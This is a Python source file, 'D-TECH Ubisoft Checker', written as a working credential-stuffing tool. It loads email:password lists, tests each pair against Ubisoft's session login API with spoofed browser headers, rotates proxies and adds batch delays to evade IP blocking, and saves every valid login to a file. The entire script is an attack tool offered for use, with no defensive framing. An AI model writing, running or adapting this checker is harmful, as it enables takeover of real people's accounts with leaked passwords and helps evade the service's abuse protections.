import requests
import base64
import json
import time
import random
import os

# Function to clear the screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ANSI escape codes for colors
class DTechColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# D-TECH Banner
def print_banner():
    print(f"""{DTechColors.OKCYAN}
===============================
       D-TECH Ubisoft Checker  
       made by preasx24  
===============================
{DTechColors.ENDC}""")

# Settings (adjusted for user input)
HEADERS = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "GenomeId": "85c31714-0941-4876-a18d-2c7e9dce8d40",
    "Host": "public-ubiservices.ubi.com",
    "Origin": "https://connect.ubisoft.com",
    "Referer": "https://connect.ubisoft.com/",
    "Ubi-AppId": "314d4fef-e568-454a-ae06-43e3bece12a6",
    "Ubi-RequestedPlatformType": "uplay",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
}
LOGIN_URL = "https://public-ubiservices.ubi.com/v3/profiles/sessions"

# Proxy Settings (Optional, Use a proxy list for better IP rotation)
PROXIES = [
    # Example: "http://username:password@proxy_address:port"
    # "http://proxy1.example.com:8080",
    # "http://proxy2.example.com:8080"
]

# Read accounts from file
def load_accounts(file_path):
    try:
        with open(file_path, 'r') as file:
            accounts = [line.strip().split(':') for line in file if ':' in line]
        return accounts
    except FileNotFoundError:
        print(f"{DTechColors.FAIL}[ERROR] {file_path} not found.{DTechColors.ENDC}")
        exit()

# Save successful accounts
def save_success(email, password, success_file):
    with open(success_file, 'a') as file:
        file.write(f"{email}:{password}\n")
    print(f"{DTechColors.OKGREEN}[SAVED] {email}:{password} saved to {success_file}{DTechColors.ENDC}")

# Check Ubisoft Account
def check_account(email, password):
    credentials = f"{email}:{password}"
    encoded_credentials = base64.b64encode(credentials.encode()).decode()
    data = {"rememberMe": True}
    headers = HEADERS.copy()
    headers["Authorization"] = f"Basic {encoded_credentials}"
    
    proxy = random.choice(PROXIES) if PROXIES else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    try:
        response = requests.post(LOGIN_URL, headers=headers, data=json.dumps(data), proxies=proxies)
        if response.status_code == 200 and "platformType" in response.text:
            print(f"{DTechColors.OKGREEN}[SUCCESS] {email}:{password} - Valid Account{DTechColors.ENDC}")
            return True
        elif "Invalid credentials" in response.text:
            print(f"{DTechColors.FAIL}[INVALID] {email}:{password} - Invalid credentials{DTechColors.ENDC}")
            return False
        else:
            print(f"{DTechColors.WARNING}[ERROR] {email}:{password} - Unexpected response{DTechColors.ENDC}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{DTechColors.FAIL}[ERROR] Network issue: {e}{DTechColors.ENDC}")
        return False

# Main Execution
def main():
    clear_screen()
    print_banner()

    # Prompt the user for file paths
    input_file = input(f"{DTechColors.BOLD}[D-TECH] Enter the path to the accounts file: {DTechColors.ENDC}")
    success_file = input(f"{DTechColors.BOLD}[D-TECH] Enter the path to save successful accounts: {DTechColors.ENDC}")
    
    accounts = load_accounts(input_file)
    print(f"{DTechColors.OKCYAN}[INFO] Loaded {len(accounts)} accounts.{DTechColors.ENDC}\n")
    
    # Inform user about testing 20 or fewer accounts
    print(f"{DTechColors.WARNING}[INFO] Please test 20 or fewer accounts at a time to avoid IP blocking. More accounts may result in being blocked!{DTechColors.ENDC}\n")
    
    batch_size = 20  # Process 20 accounts at a time
    
    # Process accounts in batches
    for start in range(0, len(accounts), batch_size):
        batch = accounts[start:start+batch_size]
        for index, (email, password) in enumerate(batch, start=start + 1):
            print(f"{DTechColors.OKBLUE}[{index}/{len(accounts)}] Checking {email}...{DTechColors.ENDC}")
            if check_account(email, password):
                save_success(email, password, success_file)
        
        # After processing the batch, delay for a random time to avoid IP blocking
        delay = random.uniform(10, 15)  # Random delay between 10-15 seconds after each batch
        print(f"{DTechColors.WARNING}[DELAY] Waiting for {delay:.2f} seconds to avoid IP blocking...{DTechColors.ENDC}")
        time.sleep(delay)
    
    print(f"{DTechColors.OKCYAN}[INFO] All accounts processed. Successfully saved valid accounts to {success_file}{DTechColors.ENDC}")

if __name__ == "__main__":
    main()